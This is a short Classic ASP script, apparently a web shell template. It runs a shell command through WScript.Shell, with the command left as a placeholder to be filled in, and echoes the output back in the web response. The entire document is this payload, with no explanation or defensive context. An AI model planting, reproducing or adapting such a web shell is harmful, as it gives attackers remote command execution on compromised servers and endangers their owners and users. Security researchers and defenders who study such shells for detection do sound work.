<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("REPLACEME_CMD")
o = cmd.StdOut.Readall()
Response.write(o)
%>
